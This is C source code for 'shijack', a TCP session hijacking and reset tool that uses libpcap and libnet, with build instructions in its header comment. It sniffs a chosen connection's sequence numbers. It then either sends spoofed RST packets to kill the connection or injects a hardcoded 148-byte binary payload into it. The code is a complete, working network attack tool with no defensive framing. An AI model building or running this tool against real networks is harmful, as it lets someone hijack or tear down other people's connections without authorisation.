/*
 * Full TCP connection hijacker (local, and on subnets), Uses libnet/libpcap
 * for better OS portability.
 *
 * Written by spwny,  Inspiration by cyclozine, modified by Qais.
 *
 * If you dont feel like installing libnet, just use the precompiled static binaries included.
 * gcc -o shijack shijack.c -lpcap `libnet-config --libs --defines --cflags`
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <libnet.h>
#include <pcap.h>
#include <signal.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/time.h>
#include <unistd.h>

#define lrandom(min, max) (random()%(max-min)+min)
struct seqack   sa;
struct seqack {
	uint32_t          seq;
	uint32_t          ack;
	uint32_t          sport;
};

void
devsrandom(void)
{
	int             fd;
	uint32_t          seed;

	fd = open("/dev/urandom", O_RDONLY);
	if (fd == -1) {
		fd = open("/dev/random", O_RDONLY);
		if (fd == -1) {
			struct timeval  tv;

			gettimeofday(&tv, NULL);
			srandom((tv.tv_sec ^ tv.tv_usec) * tv.tv_sec * tv.tv_usec ^ tv.tv_sec);
			return;
		}
	}
	read(fd, &seed, sizeof(seed));
	close(fd);
	srandom(seed);
}

void
	getseqack(char *interface, uint32_t srcip, uint32_t dstip, uint32_t sport, uint32_t dport, struct seqack *sa, int search, char *str_srcip, char *str_dstip){
		pcap_t *pt;
		char ebuf[PCAP_ERRBUF_SIZE];
		u_char *buf;
		struct libnet_ip_hdr iph;
		struct libnet_tcp_hdr tcph;
		int ethrhdr;
        pt = pcap_open_live(interface, 65535, 1, 60, ebuf);
		if(!pt){
            printf("pcap_open_live: %s\n", ebuf);
            exit(-1);
            }
		switch(pcap_datalink(pt)) {
			case DLT_EN10MB:
			case DLT_EN3MB:
			ethrhdr = 14;
			break;
		case DLT_FDDI:
			ethrhdr = 21;
			break;
		case DLT_SLIP:
			ethrhdr = 16;
			break;
		case DLT_NULL:
		case DLT_PPP:
			ethrhdr = 4;
			break;
		case DLT_RAW:
			ethrhdr = 0;
		default:
			printf("pcap_datalink: Can't figure out how big the ethernet header is.\n");
			exit(-1);
		}

		printf("Waiting for SEQ/ACK  to arrive from the %s to the %s.\n", str_srcip, str_dstip);
		printf("(To speed things up, try making some traffic between the two, /msg person asdf\n\n");


		for (;;) {
			struct pcap_pkthdr pkthdr;
			buf = (u_char *) pcap_next(pt, &pkthdr);
			if (!buf)
				continue;
			memcpy(&iph, buf + ethrhdr, sizeof(iph));
			if (iph.ip_p != IPPROTO_TCP)
				continue;
			if ((iph.ip_src.s_addr != srcip) || (iph.ip_dst.s_addr != dstip))
				continue;
			memcpy(&tcph, buf + ethrhdr + sizeof(iph), sizeof(tcph));
			if(!search){ // if true cmp given ports with captured packet
			    sa->sport = sport;
                if ((tcph.th_sport != htons(sport)) || (tcph.th_dport != htons(dport)))
                    continue;
                }else{ // sport is not provided, use current port number
                    if (tcph.th_dport != htons(dport)){
                    continue;
                    }else{
                        sa->sport = htons(tcph.th_sport);
                    }
                }
			//if (!(tcph.th_flags & TH_ACK)){
			//if (!((tcph.th_flags&0xFF00) & 0x1000)){
				//continue;
			//}
			//printf("Got packet! SEQ = %u ACK = %u\n", htonl(tcph.th_seq), htonl(tcph.th_ack));
			sa->seq = htonl(tcph.th_seq);
			sa->ack = htonl(tcph.th_ack);
			pcap_close(pt);
			return;
		}
	}


void
sendtcp(uint32_t srcip, uint32_t dstip, uint32_t sport, uint32_t dport, uint8_t flags, uint32_t seq, uint32_t ack, char *data, int datalen, char *str_srcip, char *str_dstip)
{
	u_char         *packet;
	int             fd, psize, c;
	//devsrandom();
	psize = LIBNET_IP_H + LIBNET_TCP_H + datalen;
	libnet_init_packet(psize, &packet);
	//if (!packet)
		//libnet_error(LIBNET_ERR_FATAL, "libnet_init_packet failed\n");
	fd = libnet_open_raw_sock(IPPROTO_RAW);
	//if (fd == -1)
		//libnet_error(LIBNET_ERR_FATAL, "libnet_open_raw_sock failed\n");

	libnet_build_ip(LIBNET_TCP_H + datalen, 0, random(), 0, lrandom(128, 255), IPPROTO_TCP, srcip, dstip, (u_char *) data, datalen, packet);
	libnet_build_tcp(sport, dport, seq, ack, flags, 65535, 0, (u_char *) data, datalen, packet + LIBNET_IP_H);
	libnet_do_checksum(packet, IPPROTO_TCP, datalen);
	c=libnet_write_ip(fd, packet, psize);
    if (c < psize){
        libnet_error(LN_ERR_WARNING, "libnet_write_ip only wrote %d bytes\n", c);
    }else{
        	printf("\nInjecting into %s:%u --- %s:%u\n", str_srcip, sport, str_dstip, dport);
        	printf("** construction and injection completed, wrote all %d bytes\n", c);
    }
	libnet_close_raw_sock(fd);
	libnet_destroy_packet(&packet);
}
uint32_t    srcip, dstip, sport, dport;

void
sighandle(int sig)
{
	printf("Closing connection..\n");
	sendtcp(srcip, dstip, sa.sport, dport, TH_RST, sa.seq, 0, NULL, 0, NULL, NULL);
	printf("Done, Exiting.\n");
	exit(0);
}

int
main(int argc, char *argv[])
{
	char           *ifa = argv[1];
	char            buf[4096];
	char *str_srcip, *str_dstip;
	int		reset=0 , search = 0, argi, ind = 0;
    int count = 0;

	signal(SIGTERM, sighandle);
	signal(SIGINT, sighandle);

	if (argc < 6) {
		printf("Usage: %s <interface> <src ip> <src port> <dst ip> <dst port> [-r]\n", argv[0]);
		printf("<interface>\t\tThe interface you are going to hijack on.\n");
		printf("<src ip>\t\tThe source ip of the connection.\n");
		printf("<src port>\t\tThe source port of the connection.\n");
		printf("<dst ip>\t\tThe destination IP of the connection.\n");
		printf("<dst port>\t\tThe destination port of the connection.\n");
		printf("[-r]\t\t\tReset the connection rather than hijacking it.\n");
		printf("[-s]\t\t\tSniff for source port.\n");
		exit(-1);
	}
for (argi=6; argi<argc; ++argi){
    if (argv[argi] && !strcmp(argv[argi], "-r") ){
        reset = 1;
        ind = atol(argv[++argi]);
            if (!ind){
            ind = 1;
            }else{
                search = 1;
            }
        }
	if (argv[argi] && !strcmp(argv[argi], "-s"))
	search = 1;
}
	srcip = inet_addr(argv[2]);
	dstip = inet_addr(argv[4]);
	str_srcip = argv[2];
	str_dstip = argv[4];
	sport = atol(argv[3]);
	dport = atol(argv[5]);

	if (!srcip) {
		printf("%s is not a valid ip.\n", argv[2]);
		exit(-1);
	}
	if (!dstip) {
		printf("%s is not a valid ip.\n", argv[4]);
		exit(-1);
	}
	if ((sport > 65535) || (dport > 65535) || (sport < 0) || (dport < 1)) {
		printf("The valid TCP port range is 1-65535, Source port can be 0 if port search is used.\n");
		exit(-1);
	}

	printf("\n Sniffing %s:%u --- %s:%u\n \n ", str_srcip, sport, str_dstip, dport);


if (reset) {
	for (count=0; count < ind ;++count){
      getseqack(ifa, srcip, dstip, sport, dport, &sa, search, str_srcip, str_dstip);
	    sendtcp(srcip, dstip, sa.sport, dport, TH_RST, sa.seq, 0, NULL, 0, str_srcip, str_dstip);
	}
	return 0;
	}else{// hijack
        getseqack(ifa, srcip, dstip, sport, dport, &sa, search, str_srcip, str_dstip);
	}

	/*
	 * Sending 1024 of zero bytes so the real owner of the TCP connection
	 * wont be able to get us out of sync with the SEQ.
	 */
	memset(&buf, 0, sizeof(buf));
	//sendtcp(srcip, dstip, sa.sport, dport, TH_ACK | TH_PUSH, sa.seq, sa.ack, buf, 1024, str_srcip, str_dstip);
	//sa.seq += 1024;

	char bufx[] = {0x68, 0x92, 0x4a, 0x00, 0x04, 0x00, 0x03, 0x22, 0x01, 0x00, 0x03, 0x00,
	0xb9, 0x0b, 0x00, 0x01,
	0xba, 0x0b, 0x00, 0x01,
	0xbb, 0x0b, 0x00, 0x01,
	0xbc, 0x0b, 0x00, 0x01,
	0xbd, 0x0b, 0x00, 0x01,
	0xbe, 0x0b, 0x00, 0x01,
	0xbf, 0x0b, 0x00, 0x01,
	0xc0, 0x0b, 0x00, 0x02,
	0xc1, 0x0b, 0x00, 0x02,
	0xc2, 0x0b, 0x00, 0x02,
	0xc3, 0x0b, 0x00, 0x02,
	0xc4, 0x0b, 0x00, 0x02,
	0xc5, 0x0b, 0x00, 0x02,
	0xc6, 0x0b, 0x00, 0x02,
	0xc7, 0x0b, 0x00, 0x02,
	0xc8, 0x0b, 0x00, 0x00,
	0xc9, 0x0b, 0x00, 0x00,
	0xca, 0x0b, 0x00, 0x00,
	0xcb, 0x0b, 0x00, 0x00,
	0xcc, 0x0b, 0x00, 0x00,
	0xcd, 0x0b, 0x00, 0x00,
	0xce, 0x0b, 0x00, 0x00,
	0xcf, 0x0b, 0x00, 0x00,
	0xd0, 0x0b, 0x00, 0x00,
	0xd1, 0x0b, 0x00, 0x00,
	0xd2, 0x0b, 0x00, 0x00,
	0xd3, 0x0b, 0x00, 0x00,
	0xd4, 0x0b, 0x00, 0x00,
	0xd5, 0x0b, 0x00, 0x00,
	0xd6, 0x0b, 0x00, 0x00,
	0xd7, 0x0b, 0x00, 0x00,
	0xd8, 0x0b, 0x00, 0x00,
	0xd9, 0x0b, 0x00, 0x00,
	0xda, 0x0b, 0x00, 0x00};
  
  sendtcp(srcip, dstip, sa.sport, dport, TH_ACK | TH_PUSH, sa.seq, sa.ack, bufx, 148, str_srcip, str_dstip);
    sa.seq += 148;

	//printf("Starting hijack session, Please use ^C to terminate.\n");
	//printf("Anything you enter from now on is sent to the hijacked TCP connection.\n");
/*
	while (fgets(buf, sizeof(buf) - 1, stdin)) {
		sendtcp(srcip, dstip, sa.sport, dport, TH_ACK | TH_PUSH, sa.seq, sa.ack, buf, strlen(buf), str_srcip, str_dstip);
		sa.seq += strlen(buf);
		memset(&buf, 0, sizeof(buf));
	}
	*/
	//sendtcp(srcip, dstip, sa.sport, dport, TH_ACK | TH_FIN, sa.seq, sa.ack, NULL, 0, str_srcip, str_dstip);
	printf("Exiting..\n");
	return (0);
}

